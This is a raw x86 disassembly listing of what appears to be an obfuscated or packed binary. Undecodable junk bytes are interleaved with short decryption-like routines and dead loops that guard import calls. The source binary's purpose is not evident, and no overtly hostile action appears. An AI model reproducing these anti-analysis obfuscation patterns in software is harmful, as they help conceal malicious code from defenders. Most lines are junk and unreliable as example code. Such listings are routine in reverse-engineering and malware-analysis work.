  404c3a:	js     0x404c01
  404c3c:	(bad)  
  404c3e:	mov    al,ah
  404c40:	jo     0x404c39
  404c42:	dec    ecx
  404c43:	popf   
  404c44:	retf   0x4b09
  404c47:	dec    edx
  404c48:	jno    0x404c96
  404c4a:	(bad)  
  404c4c:	adc    al,0x82
  404c4e:	aaa    
  404c4f:	mov    eax,ds:0xc135ce96
  404c54:	imul   esi,DWORD PTR [ecx+ebx*2-0x72],0xffffffa2
  404c59:	fs retf 
  404c5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c5c:	retf   0xb8f1
  404c5f:	aas    
  404c60:	mov    edi,0x66c5595d
  404c65:	out    0x19,al
  404c67:	lods   al,BYTE PTR ds:[esi]
  404c68:	pusha  
  404c69:	out    0x2a,al
  404c6b:	push   edx
  404c6c:	mov    DWORD PTR [ebp-0x14],edx
  404c6f:	mov    edx,DWORD PTR [ebp-0xc]
  404c72:	mov    edi,DWORD PTR [ebp-0x24]
  404c75:	jmp    0x404dda
  404c7a:	or     al,BYTE PTR [ecx-0x1aa2d1be]
  404c80:	push   0xffffffbd
  404c82:	cmp    eax,ecx
  404c84:	dec    esi
  404c85:	shl    DWORD PTR [ebx-0x2934820e],0x15
  404c8c:	jl     0x404d0a
  404c8e:	xor    al,0x7f
  404c90:	jl     0x404d0e
  404c92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c93:	shl    BYTE PTR ds:0xb8f11b40,1
  404c99:	fisub  DWORD PTR [ebp+0x275092ef]
  404c9f:	xchg   edx,eax
  404ca0:	push   edi
  404ca1:	(bad)  
  404ca3:	gs aaa 
  404ca5:	sbb    edi,DWORD PTR [esi-0x7c]
  404ca8:	mov    eax,DWORD PTR [ebx]
  404caa:	dec    esi
  404cab:	enter  0xeef4,0x7a
  404caf:	outs   dx,DWORD PTR ds:[esi]
  404cb0:	sbb    ebp,ebx
  404cb2:	mov    BYTE PTR [ecx-0x5c],ch
  404cb5:	ins    DWORD PTR es:[edi],dx
  404cb6:	pop    ebp
  404cb7:	ror    DWORD PTR [edx-0x3b],1
  404cba:	mov    ?,edi
  404cbc:	imul   eax,DWORD PTR [edi],0xe0707a7
  404cc2:	lods   eax,DWORD PTR ds:[esi]
  404cc3:	push   0x8a33def7
  404cc8:	iret   
  404cc9:	push   eax
  404cca:	inc    esp
  404ccb:	mov    ds:0x39674168,eax
  404cd0:	mov    BYTE PTR [eax+eiz*4],ch
  404cd3:	out    dx,al
  404cd4:	xchg   ecx,eax
  404cd5:	mov    dl,0x1b
  404cd7:	sti    
  404cd8:	mov    eax,0xd12f3dae
  404cdd:	push   ds
  404cde:	dec    esi
  404cdf:	jmp    0xd736ad6d
  404ce4:	sahf   
  404ce5:	ret    
  404ce6:	fld    QWORD PTR [ecx]
  404ce8:	sub    eax,0x777ddccf
  404ced:	bound  esp,QWORD PTR [ecx+ecx*8+0xb]
  404cf1:	or     BYTE PTR [edx-0x5b],cl
  404cf4:	mov    dl,0x9f
  404cf6:	std    
  404cf7:	and    DWORD PTR ds:0x1c122c7,0x39
  404cfe:	add    dh,BYTE PTR ds:0xfbb1daac
  404d04:	mov    al,0xa
  404d06:	mov    ds:0xb15475d8,al
  404d0b:	(bad)  
  404d0d:	mov    edi,0x2b3630f3
  404d12:	and    al,0xbc
  404d14:	xchg   BYTE PTR ds:0x861dab12,bh
  404d1a:	or     ecx,ecx
  404d1c:	sbb    BYTE PTR [esi],dl
  404d1e:	jns    0x404d6a
  404d20:	push   0x73
  404d22:	xchg   ebx,eax
  404d23:	(bad)  
  404d24:	pop    edx
  404d25:	ds push ds
  404d27:	jns    0x404d49
  404d29:	push   0x325a08be
  404d2e:	rcr    bl,1
  404d30:	loopne 0x404d84
  404d32:	repnz rcr DWORD PTR [edi],1
  404d35:	and    al,0x4a
  404d37:	adc    dh,BYTE PTR [esi+0x7570cd49]
  404d3d:	clc    
  404d3e:	daa    
  404d3f:	xor    al,BYTE PTR [edx-0x3]
  404d42:	sahf   
  404d43:	and    ebp,edx
  404d45:	sahf   
  404d46:	xchg   ebp,eax
  404d47:	and    esi,ebx
  404d49:	jecxz  0x404d47
  404d4b:	xchg   ecx,eax
  404d4c:	cmp    dh,BYTE PTR [ecx*2+0x7387dd30]
  404d53:	pushf  
  404d54:	mov    cl,0x11
  404d56:	adc    ah,BYTE PTR [ecx-0x6843ec2b]
  404d5c:	mov    ebp,0x80fc45a3
  404d61:	xchg   ebp,eax
  404d62:	aas    
  404d63:	push   gs
  404d65:	shl    DWORD PTR [ebp+0x7d8b48cd],cl
  404d6b:	inc    edi
  404d6c:	xor    al,0xd3
  404d6e:	mov    dl,0x23
  404d70:	imul   ebx,DWORD PTR [edi+0x517ba084],0xd0bf2f4c
  404d7a:	mov    esp,0xa8af19c5
  404d7f:	daa    
  404d80:	adc    BYTE PTR [eax-0x7349b36f],al
  404d86:	jbe    0x404d86
  404d88:	cmc    
  404d89:	popa   
  404d8a:	addr16 push ebx
  404d8c:	jnp    0x404e07
  404d8e:	addr16 cmc 
  404d90:	cmp    DWORD PTR [esi+eax*1],0x8d8a6197
  404d97:	sbb    BYTE PTR [eax-0x17],bl
  404d9a:	pop    edx
  404d9b:	rcr    ch,1
  404d9d:	das    
  404d9e:	or     DWORD PTR [eax-0x44],eax
  404da1:	jmp    0x404d97
  404da3:	cwde   
  404da4:	pusha  
  404da5:	inc    esp
  404da6:	ficom  DWORD PTR [edi+eax*4-0x13]
  404daa:	and    al,bh
  404dac:	xchg   ebx,eax
  404dad:	rcr    BYTE PTR [ebp+0x690f9720],1
  404db3:	pop    ecx
  404db4:	hlt    
  404db5:	inc    esi
  404db6:	jp     0x404d3e
  404db8:	retf   0x44eb
  404dbb:	outs   dx,DWORD PTR ds:[esi]
  404dbc:	push   eax
  404dbd:	xor    esi,DWORD PTR [ebx]
  404dbf:	aad    0x77
  404dc1:	shr    DWORD PTR [edx-0x47],cl
  404dc4:	cmp    ecx,DWORD PTR [ebp+0x10]
  404dc7:	jbe    0x404d76
  404dc9:	mov    WORD PTR [esp+edx*4+0x665ac1f0],fs
  404dd0:	aam    0xf0
  404dd2:	and    dh,ch
  404dd4:	xchg   ecx,eax
  404dd5:	mov    ds:0x15e69634,al
  404dda:	xor    edx,eax
  404ddc:	add    edx,ecx
  404dde:	imul   edx,edi
  404de1:	mov    edi,DWORD PTR [ebp-0xc]
  404de4:	xor    edi,eax
  404de6:	sub    edx,edi
  404de8:	mov    edi,DWORD PTR [ebp-0xc]
  404deb:	mov    ebx,DWORD PTR [ebp-0x14]
  404dee:	jmp    0x404f53
  404df3:	push   ebx
  404df4:	pop    ebx
  404df5:	inc    edx
  404df6:	cmp    DWORD PTR [edx-0x67],0x31957d53
  404dfd:	jb     0x404e2d
  404dff:	mov    BYTE PTR [edx],cl
  404e01:	pushf  
  404e02:	xor    eax,0x7c7c14ae
  404e07:	xor    al,0x7f
  404e09:	jl     0x404e87
  404e0b:	and    ebp,DWORD PTR [eax+0x6b855609]
  404e11:	add    bh,ch
  404e13:	xor    eax,0xa2e89153
  404e18:	pop    esi
  404e19:	in     eax,0x2b
  404e1b:	xor    ebx,DWORD PTR [eax+0x48a59cdb]
  404e21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e22:	(bad)  
  404e23:	and    bl,bh
  404e25:	rcl    edx,1
  404e27:	cmc    
  404e28:	into   
  404e29:	test   al,0x39
  404e2b:	out    0xd2,eax
  404e2d:	mov    esp,?
  404e2f:	pop    ebp
  404e30:	sub    DWORD PTR [edx+0x62],edx
  404e33:	fldcw  WORD PTR [esi]
  404e35:	cld    
  404e36:	mov    ds:0xd6712d19,eax
  404e3b:	or     BYTE PTR [edi],0xdc
  404e3e:	adc    dl,dl
  404e40:	xchg   DWORD PTR [edi],edi
  404e42:	sbb    DWORD PTR [edi],0x31
  404e45:	dec    esi
  404e46:	repz fldcw WORD PTR [eax+0x22]
  404e4a:	xor    eax,0x512e8d85
  404e4f:	pop    ds
  404e50:	dec    BYTE PTR [ecx-0x38]
  404e53:	cmp    cl,BYTE PTR [edx+0x1acfcc2]
  404e59:	dec    esi
  404e5a:	sti    
  404e5b:	cwde   
  404e5c:	or     dh,BYTE PTR [ecx+0x4e]
  404e5f:	push   edx
  404e60:	push   cs
  404e61:	imul   eax,DWORD PTR [esi+edx*1],0xffffffe4
  404e65:	dec    esp
  404e66:	xchg   esi,eax
  404e67:	pop    ecx
  404e68:	dec    ebp
  404e69:	jmp    0x404eac
  404e6b:	shr    edi,0xb2
  404e6e:	push   0x2c9b0427
  404e73:	in     al,0x41
  404e75:	lods   al,BYTE PTR ds:[esi]
  404e76:	mov    bh,0x80
  404e78:	mov    DWORD PTR [esi+0x5a5bf6d4],edi
  404e7e:	jl     0x404e15
  404e80:	cmp    eax,0x114588f8
  404e85:	fs push ebp
  404e87:	xor    DWORD PTR [eax],ebp
  404e89:	rcl    DWORD PTR [ebp-0x13],cl
  404e8c:	or     cl,0x77
  404e8f:	repnz jecxz 0x404e17
  404e92:	rol    BYTE PTR [eax],1
  404e94:	and    edx,0xfffffff7
  404e97:	or     al,0x2a
  404e99:	jp     0x404e8c
  404e9b:	dec    ebx
  404e9c:	call   0x6e88:0x32a7dec8
  404ea3:	shl    cl,0x1c
  404ea6:	xchg   ebx,eax
  404ea7:	dec    ebp
  404ea8:	shr    DWORD PTR [ebp+edx*8-0x4c],cl
  404eac:	mov    esi,0xade46e1e
  404eb1:	pop    es
  404eb2:	out    dx,al
  404eb3:	mov    BYTE PTR [edi-0x487f52f5],ah
  404eb9:	rol    BYTE PTR [ebp+0x60],0x12
  404ebd:	sti    
  404ebe:	dec    edi
  404ebf:	(bad)  
  404ec3:	repnz cmp ebx,DWORD PTR [ecx]
  404ec6:	fs popa 
  404ec8:	or     ch,BYTE PTR [esi]
  404eca:	sub    edi,eax
  404ecc:	mov    al,ds:0xbae98aa6
  404ed1:	jae    0x404e8e
  404ed3:	adc    ch,cl
  404ed5:	outs   dx,DWORD PTR ds:[esi]
  404ed6:	dec    ebp
  404ed7:	adc    al,BYTE PTR [edx-0xd2d3ebd]
  404edd:	addr16 mov dl,0x7f
  404ee0:	lods   eax,DWORD PTR ds:[esi]
  404ee1:	sbb    cl,BYTE PTR [edi-0x5b5b1794]
  404ee7:	push   ecx
  404ee8:	aam    0x43
  404eea:	je     0x404e7b
  404eec:	cmp    BYTE PTR [ebx],bh
  404eee:	hlt    
  404eef:	lods   al,BYTE PTR ds:[esi]
  404ef0:	push   ds
  404ef1:	dec    ebp
  404ef2:	sub    ecx,DWORD PTR es:[eax-0x6e116451]
  404ef9:	mov    al,cl
  404efb:	fwait
  404efc:	pop    es
  404efd:	xor    bh,BYTE PTR [bx+di]
  404f00:	xor    DWORD PTR [esi],edi
  404f02:	xor    dh,dl
  404f04:	jo     0x404f5d
  404f06:	adc    al,0x98
  404f08:	xchg   BYTE PTR [ecx-0x17],ah
  404f0b:	repnz lahf 
  404f0d:	cmp    edx,esp
  404f0f:	fdiv   DWORD PTR [esi-0x14]
  404f12:	or     eax,0x549c1ec8
  404f17:	mov    ebp,0x38374da6
  404f1c:	and    eax,0x92b28ca2
  404f21:	fs retf 0x90f2
  404f25:	adc    DWORD PTR ds:0x3c6f37ca,eax
  404f2b:	push   es
  404f2c:	imul   ebp,DWORD PTR [edi],0xffffff94
  404f2f:	dec    ecx
  404f30:	jg     0x404f97
  404f32:	dec    ebp
  404f33:	lock add al,0x2c
  404f36:	and    BYTE PTR [ebp+eax*4+0x64],ch
  404f3a:	jnp    0x404f6b
  404f3c:	idiv   BYTE PTR [ebx+0x0]
  404f3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f40:	loopne 0x404f4d
  404f42:	aas    
  404f43:	neg    BYTE PTR [esi]
  404f45:	ja     0x404fa6
  404f47:	mov    WORD PTR [esi],fs
  404f49:	hlt    
  404f4a:	push   es
  404f4b:	(bad)  [ecx]
  404f4d:	gs ins BYTE PTR es:[edi],dx
  404f4f:	sub    esi,DWORD PTR cs:[edi]
  404f52:	les    esi,FWORD PTR [ebx]
  404f54:	clc    
  404f55:	add    edi,ecx
  404f57:	imul   edi,ebx
  404f5a:	mov    ebx,DWORD PTR [ebp-0x18]
  404f5d:	xor    ebx,eax
  404f5f:	sub    edx,ecx
  404f61:	lea    edi,[edi+ebx*1+0x32729e]
  404f68:	cmp    edi,edx
  404f6a:	jbe    0x4047d5
  404f70:	mov    edx,DWORD PTR [ebp-0xc]
  404f73:	mov    edi,DWORD PTR [ebp-0x24]
  404f76:	xor    edx,eax
  404f78:	add    edx,ecx
  404f7a:	imul   edx,edi
  404f7d:	mov    edi,DWORD PTR [ebp-0x18]
  404f80:	xor    edi,eax
  404f82:	add    edx,edi
  404f84:	mov    edi,DWORD PTR [ebp-0x8]
  404f87:	lea    edx,[edx+edi*1+0x32729e]
  404f8e:	mov    DWORD PTR [ebp-0x8],edx
  404f91:	jmp    0x4050f6
  404f96:	jecxz  0x404f49
  404f98:	out    0xe3,eax
  404f9a:	jge    0x405019
  404f9c:	sti    
  404f9d:	mov    cl,0x66
  404f9f:	pop    edx
  404fa0:	cmp    BYTE PTR ds:0x8ed58e2a,cl
  404fa6:	popw   ss
  404fa8:	jl     0x405026
  404faa:	xor    al,0x7f
  404fac:	jl     0x40502a
  404fae:	xchg   edx,eax
  404faf:	sahf   
  404fb0:	push   0x4bb631bf
  404fb5:	dec    edi
  404fb6:	ja     0x404fb0
  404fb8:	rcl    BYTE PTR [ecx-0x4a],1
  404fbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404fbc:	inc    edi
  404fbd:	dec    esi
  404fbe:	stos   DWORD PTR es:[edi],eax
  404fbf:	inc    esp
  404fc0:	jo     0x404fcf
  404fc2:	adc    esp,DWORD PTR [esi]
  404fc4:	ds xor eax,0x24e7e8e
  404fca:	xor    al,0x26
  404fcc:	inc    eax
  404fcd:	mov    al,BYTE PTR [edx+eiz*1]
  404fd0:	mov    dh,0x13
  404fd2:	fs jg  0x404f72
  404fd5:	mov    ebp,0x69185d14
  404fda:	imul   edx,esp,0xffffff86
  404fdd:	call   0x782a:0x570b7ff7
  404fe4:	cld    
  404fe5:	sahf   
  404fe6:	xor    dh,al
  404fe8:	(bad)  
  404fe9:	sbb    edx,DWORD PTR [edx+0x498a33b3]
  404fef:	cli    
  404ff0:	mov    ebp,0x70f02bd3
  404ff5:	push   ebx
  404ff6:	xor    al,0xfa
  404ff8:	popa   
  404ff9:	mov    cl,0x76
  404ffb:	inc    esp
  404ffc:	or     eax,0xd0ea01e8
  405001:	test   al,0xeb
  405003:	imul   edi,edx,0x9d8720c9
  405009:	cs dec ebx
  40500b:	pop    ds
  40500c:	rcr    DWORD PTR [eax-0x190815cc],0x75
  405013:	mov    eax,ds:0x5c89b3df
  405018:	jmp    0x40504e
  40501a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40501b:	jle    0x404fc2
  40501d:	xchg   ecx,eax
  40501e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40501f:	sahf   
  405020:	cmp    eax,0x22ca6263
  405025:	mov    esp,0xa5792d7a
  40502a:	adc    ebx,DWORD PTR [ecx]
  40502c:	mov    edx,0x743cb730
  405031:	arpl   WORD PTR [ecx],si
  405033:	loopne 0x404fde
  405035:	jp     0x405092
  405037:	or     DWORD PTR [ebx],ebx
  405039:	push   edx
  40503a:	or     ch,BYTE PTR [esi]
  40503c:	sar    DWORD PTR [eax-0xb],1
  40503f:	pop    eax
  405040:	cs jnp 0x4050ad
  405043:	lea    ebp,ds:0x2e16f396
  405049:	in     eax,0xe4
  40504b:	dec    esp
  40504c:	mov    WORD PTR [ebx],gs
  40504e:	xor    DWORD PTR ds:0x551a9fa8,edx
  405054:	pushf  
  405055:	xchg   ebp,eax
  405056:	sbb    edx,ecx
  405058:	test   eax,0xfee74683
  40505d:	push   esp
  40505e:	inc    ebx
  40505f:	test   BYTE PTR [edx],0xe7
  405062:	pushw  0xff86
  405065:	ror    BYTE PTR [eax],0xb3
  405068:	loope  0x4050c7
  40506a:	enter  0x3ef9,0xc
  40506e:	lds    ebx,FWORD PTR [ecx-0x4d]
  405071:	fnsave [ebx+eax*8-0x39]
  405075:	jno    0x4050b7
  405077:	jmp    DWORD PTR [edx]
  405079:	add    BYTE PTR [esi],bl
  40507b:	pop    ebx
  40507c:	inc    esp
  40507d:	or     esp,DWORD PTR [bp-0x37]
  405081:	in     al,0xb6
  405083:	mov    al,0x72
  405085:	push   cs
  405086:	jecxz  0x405072
  405088:	sub    al,0xd8
  40508a:	aaa    
  40508b:	ja     0x405037
  40508d:	leave  
  40508e:	dec    ecx
  40508f:	mov    dh,0x57
  405091:	push   ebx
  405092:	je     0x40504c
  405094:	mov    edi,0xc2115f1f
  405099:	xlat   BYTE PTR ds:[ebx]
  40509a:	pushf  
  40509b:	popf   
  40509c:	inc    ecx
  40509d:	les    ecx,FWORD PTR [edx+0x2]
  4050a0:	cmp    ecx,DWORD PTR [esi+0x1b711fb9]
  4050a6:	shr    DWORD PTR [ebx-0x4262db0e],1
  4050ac:	js     0x4050ae
  4050ae:	retf   0xba28
  4050b1:	xchg   esi,eax
  4050b2:	dec    ecx
  4050b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4050b4:	shr    DWORD PTR [eax-0x6b58fbd4],cl
  4050ba:	int    0x17
  4050bc:	pushf  
  4050bd:	cli    
  4050be:	pop    ebp
  4050bf:	sbb    ecx,edi
  4050c1:	mov    edx,0x52c4b31b
  4050c6:	jge    0x4050ae
  4050c8:	enter  0xf2fb,0x49
  4050cc:	cdq    
  4050cd:	inc    esi
  4050ce:	xchg   BYTE PTR [edx+0xed89897],bh
  4050d4:	or     eax,0x4c595c14
  4050d9:	arpl   di,dx
  4050db:	and    DWORD PTR [eax+edi*8-0x1b9eec9a],edi
  4050e2:	or     al,0x53
  4050e4:	and    esp,DWORD PTR [eax-0x77]
  4050e7:	mov    bh,0x8
  4050e9:	sbb    eax,0x6875ce29
  4050ee:	xlat   BYTE PTR ds:[ebx]
  4050ef:	mov    al,ds:0x3f3ecc66
  4050f4:	test   BYTE PTR [edx+0x33e0558b],0xd0
  4050fb:	mov    edi,0xffcd8d62
  405100:	sub    edi,edx
  405102:	add    edi,DWORD PTR [ebp-0x10]
  405105:	mov    edx,DWORD PTR [ebp-0x20]
  405108:	mov    ebx,DWORD PTR [ebp-0x8]
  40510b:	xor    edx,eax
  40510d:	add    edx,ecx
  40510f:	imul   edx,ebx
  405112:	cmp    edx,edi
  405114:	jbe    0x4038c9
  40511a:	pop    ebx
  40511b:	pop    edi
  40511c:	leave  
  40511d:	ret    0x8
  405120:	push   ebp
  405121:	mov    ebp,esp
  405123:	push   ecx
  405124:	adc    DWORD PTR ds:0x41074f,ebx
  40512a:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  405131:	and    DWORD PTR ds:0x4479a0,0x0
  40513b:	jmp    0x40514d
  405140:	mov    edx,DWORD PTR ds:0x4479a0
  405146:	inc    edx
  405147:	mov    DWORD PTR ds:0x4479a0,edx
  40514d:	cmp    DWORD PTR ds:0x4479a0,0x10
  405154:	jae    0x40518d
  40515a:	cmp    DWORD PTR ds:0x4479a0,0x18
  405161:	jne    0x40517b
  405167:	push   DWORD PTR [ebp-0x10]
  40516a:	push   DWORD PTR [ebp-0x14]
  40516d:	push   0x410939
  405172:	push   DWORD PTR [ebp-0x10]
  405175:	call   DWORD PTR ds:0x442010
  40517b:	jmp    0x405140
  405180:	movzx  edx,BYTE PTR ds:0x44a6e4
  405187:	adc    DWORD PTR ds:0x424849,edx
  40518d:	mov    eax,DWORD PTR [ebp-0x4]
  405190:	adc    edx,ecx
  405192:	jmp    0x4052a5
  405197:	shr    DWORD PTR [ebp+0x4e7dfe7d],cl
  40519d:	sti    
  40519e:	ins    DWORD PTR es:[edi],dx
  40519f:	fs jne 0x40519a
  4051a2:	push   edi
  4051a3:	inc    ecx
  4051a4:	scas   al,BYTE PTR es:[edi]
  4051a5:	mov    eax,ds:0x7c293e85
  4051aa:	jl     0x40520e
  4051ac:	jl     0x40522a
  4051ae:	jl     0x4051fa
  4051b0:	mov    edi,0x33ca7d61
  4051b5:	pushf  
  4051b6:	push   es
  4051b7:	nop
  4051b8:	xchg   edi,eax
  4051b9:	add    edi,DWORD PTR [edi]
  4051bb:	gs pop esi
  4051bd:	add    BYTE PTR [eax-0xa7906db],cl
  4051c3:	stos   BYTE PTR es:[edi],al
  4051c4:	(bad)  
  4051c5:	adc    dl,BYTE PTR [esi+0x49]
  4051c8:	mov    ebp,0xb3aa7c33
  4051cd:	sub    dh,BYTE PTR [esi-0x2849293d]
  4051d3:	ins    BYTE PTR es:[edi],dx
  4051d4:	nop
  4051d5:	hlt    
  4051d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051d7:	mov    ds:0xdac45732,eax
  4051dc:	ja     0x405259
  4051de:	dec    eax
  4051df:	in     eax,0xf2
  4051e1:	imul   ebp,esi,0x2d
  4051e4:	mov    esp,0x72ad4281
  4051e9:	add    edi,eax
  4051eb:	rcr    ebp,cl
  4051ed:	push   edx
  4051ee:	shl    edi,0x6f
  4051f1:	mov    esi,0x68883b1b
  4051f6:	pop    eax
  4051f7:	push   eax
  4051f8:	cmc    
  4051f9:	adc    eax,0xa1fec60c
  4051fe:	arpl   WORD PTR cs:[ecx+0x6f],dx
  405202:	test   al,0xfe
  405204:	(bad)  
  405206:	cwde   
  405207:	xor    al,0x32
  405209:	mov    dh,0x1b
  40520b:	pop    esi
  40520c:	mov    dl,BYTE PTR [edi+edx*8-0x27]
  405210:	aad    0x76
  405212:	aaa    
  405213:	lea    ebp,[edx+0x94666a7]
  405219:	jge    0x40520d
  40521b:	stos   DWORD PTR es:[edi],eax
  40521c:	dec    eax
  40521d:	mov    esp,0x9130168f
  405222:	loopne 0x405272
  405224:	rcl    DWORD PTR [esi-0x30],1
  405227:	or     ebx,DWORD PTR [edi+ebx*1-0x4d]
  40522b:	out    dx,al
  40522c:	sbb    dh,BYTE PTR [ecx-0x71d04553]
  405232:	and    bl,BYTE PTR [esi+0x40]
  405235:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405236:	dec    edx
  405237:	xchg   esi,eax
  405238:	dec    ebp
  405239:	xor    ch,BYTE PTR [ebx-0x42]
  40523c:	scas   al,BYTE PTR es:[edi]
  40523d:	dec    edx
  40523e:	rol    BYTE PTR ds:0x68b9de,cl
  405244:	ret    0xe7c5
  405247:	xchg   BYTE PTR [edi-0x56625edf],cl
  40524d:	repnz out 0x17,al
  405250:	imul   BYTE PTR [edi-0x4855fdd2]
  405256:	arpl   WORD PTR [ecx+0x20],bp
  405259:	test   DWORD PTR [ebx],esi
  40525b:	ja     0x4051f3
  40525d:	cld    
  40525e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40525f:	test   ecx,esi
  405261:	pop    ds
  405262:	popf   
  405263:	loopne 0x40526b
  405265:	cmp    al,0x2c
  405267:	jp     0x405222
  405269:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40526a:	dec    ebp
  40526b:	mov    edx,ebp
  40526d:	xor    esi,ebp
  40526f:	imul   eax,DWORD PTR [esi-0x564be2a],0x4d
  405276:	test   al,0xe9
  405278:	sbb    eax,0xe8c79a4d
  40527d:	fnstcw WORD PTR [ebp+0x8]
  405280:	or     dh,BYTE PTR [bx+di]
  405283:	mov    ds:0x45e49332,al
  405288:	add    DWORD PTR [edi],0xffffffa0
  40528b:	in     eax,0x58
  40528d:	sbb    BYTE PTR ds:0xed90e369,dh
  405293:	stos   BYTE PTR es:[edi],al
  405294:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405295:	lods   eax,DWORD PTR ds:[esi]
  405296:	dec    ebx
  405297:	es into 
  405299:	pop    edi
  40529a:	(bad)  
  40529b:	sbb    eax,0x469ccceb
  4052a0:	aaa    
  4052a1:	retf   
  4052a2:	dec    ecx
  4052a3:	jae    0x4052ab
  4052a5:	mov    edx,DWORD PTR [ebp+0x10]
  4052a8:	jmp    0x4053bb
  4052ad:	shl    ecx,0xe4
  4052b0:	xchg   edi,eax
  4052b1:	fs jns 0x4052f5
  4052b4:	jns    0x4052eb
  4052b6:	adc    al,0x56
  4052b8:	jne    0x4052f9
  4052ba:	loopne 0x4052dc
  4052bc:	aam    0x24
  4052be:	sub    BYTE PTR [esp+edi*2+0x62],bh
  4052c2:	jl     0x405340
  4052c4:	jl     0x4052b2
  4052c6:	cdq    
  4052c7:	sub    dh,ah
  4052c9:	mul    BYTE PTR [ecx+esi*4]
  4052cc:	addr16 pop ds
  4052ce:	dec    ebp
  4052cf:	push   es
  4052d0:	sbb    eax,0x1c1c5807
  4052d5:	dec    BYTE PTR [ebx+0x4d40b6f3]
  4052db:	call   0xd8e4abfa
  4052e0:	fcom   QWORD PTR [ebx+0x26]
  4052e3:	call   0xbc9f549f
  4052e8:	fnstcw WORD PTR [eax+0x3b]
  4052eb:	iret   
  4052ec:	repz pop ebx
  4052ee:	test   DWORD PTR es:[eax+0x49d112ea],ebx
  4052f5:	es cli 
  4052f7:	mov    cl,0xc3
  4052f9:	mov    ebx,0xf6c4b440
  4052fe:	ja     0x405331
  405300:	popf   
  405301:	stc    
  405302:	push   eax
  405303:	cwde   
  405304:	test   al,0xb4
  405306:	mov    al,ds:0xac313dd7
  40530b:	adc    bl,BYTE PTR [edi+ecx*2]
  40530e:	add    esp,DWORD PTR [edi]
  405310:	pop    es
  405311:	adc    DWORD PTR [eax],edx
  405313:	(bad)  
  405314:	shl    BYTE PTR [ecx-0x45],1
  405317:	mov    cl,0x6d
  405319:	cmp    BYTE PTR [ecx],dh
  40531b:	sbb    al,0x4c
  40531d:	mov    esp,gs
  40531f:	adc    DWORD PTR [eax-0x5c2d9536],ecx
  405325:	daa    
  405326:	dec    edi
  405327:	enter  0xe57a,0x9
  40532b:	mov    ebp,0x84a49b55
  405330:	pop    ebp
  405331:	pop    ds
  405332:	mov    ah,0xe4
  405334:	sbb    esi,esp
  405336:	fwait
  405337:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405338:	iret   
  405339:	test   bl,dh
  40533b:	mov    ch,0xe2
  40533d:	mov    bl,0xf4
  40533f:	dec    eax
  405340:	imul   eax,DWORD PTR [ebp+edx*4+0x122005c5],0x51467778
  40534b:	push   edi
  40534c:	adc    BYTE PTR [edx+0x3d01cef5],0xf6
  405353:	je     0x405328
  405355:	cwde   
  405356:	push   eax
  405357:	sub    al,0xe0
  405359:	test   al,0x24
  40535b:	test   eax,0x27aedb48
  405360:	je     0x4053cd
  405362:	sub    BYTE PTR [edi+0x41],cl
  405365:	push   ebp
  405366:	xchg   ebx,eax
  405367:	jle    0x4053a4
  405369:	or     eax,0x7d1ba6d6
  40536e:	push   ebx
  40536f:	(bad)  
  405370:	out    dx,al
  405371:	in     eax,0x13
  405373:	jge    0x4053e4
  405375:	lods   eax,DWORD PTR ds:[esi]
  405376:	clc    
  405377:	popa   
  405378:	jne    0x4053e2
  40537a:	hlt    
  40537b:	or     cl,bl
  40537d:	xchg   ecx,eax
  40537e:	cmp    edi,DWORD PTR [esi-0x1bf7b3ba]
  405384:	mov    ebp,0x262205ec
  405389:	or     BYTE PTR [ebx-0x74],0xa7
  40538d:	lds    ebx,FWORD PTR [esi-0x2d]
  405390:	rcr    BYTE PTR [ecx],0x90
  405393:	bound  ebp,QWORD PTR [esi+0x6017439f]
  405399:	and    al,0x5a
  40539b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40539c:	sub    cl,BYTE PTR [ecx-0x74e3d10c]
  4053a2:	dec    esp
  4053a3:	xchg   BYTE PTR [edi],ah
  4053a5:	cld    
  4053a6:	(bad)  
  4053a7:	imul   esi,DWORD PTR [ebx-0x65cc7348],0x355b5457
  4053b1:	test   DWORD PTR ds:0xba12f61b,esp
  4053b7:	(bad)  
  4053b8:	and    edi,edi
  4053ba:	adc    eax,0x510857b9
  4053bf:	pop    es
  4053c0:	xor    DWORD PTR ds:0x424851,0x5c99
  4053ca:	xor    eax,ecx
  4053cc:	add    eax,0x32729e
  4053d1:	sub    DWORD PTR ds:0x42485d,0x41074b
  4053db:	mov    DWORD PTR [edx],eax
  4053dd:	mov    eax,DWORD PTR [ebp+0xc]
  4053e0:	xor    eax,ecx
  4053e2:	push   esi
  4053e3:	add    DWORD PTR ds:0x44a6e4,0x2efc
  4053ed:	mov    esi,DWORD PTR [ebp+0x10]
  4053f0:	mov    edx,0x32729e
  4053f5:	sub    DWORD PTR ds:0x44d428,0x7c97
  4053ff:	add    eax,edx
  405401:	xor    DWORD PTR ds:0x44d428,0x44a6dc
  40540b:	mov    DWORD PTR [esi+0x4],eax
  40540e:	mov    DWORD PTR ds:0x44d424,0x1d
  405418:	cmp    DWORD PTR ds:0x44d424,0x0
  40541f:	je     0x405452
  405425:	cmp    DWORD PTR ds:0x44d424,0x21
  40542c:	jne    0x405442
  405432:	push   0x4107d0
  405437:	push   0x400000
  40543c:	call   DWORD PTR ds:0x4420dc
  405442:	mov    eax,ds:0x44d424
  405447:	dec    eax
  405448:	mov    ds:0x44d424,eax
  40544d:	jmp    0x405418
  405452:	mov    eax,DWORD PTR [ebp+0x14]
  405455:	mov    esi,DWORD PTR [ebp+0x10]
  405458:	mov    DWORD PTR [esi+0x8],eax
  40545b:	mov    eax,DWORD PTR [ebp+0x18]
  40545e:	mov    esi,DWORD PTR [ebp+0x10]
  405461:	mov    DWORD PTR [esi+0xc],eax
  405464:	mov    eax,DWORD PTR [ebp+0x1c]
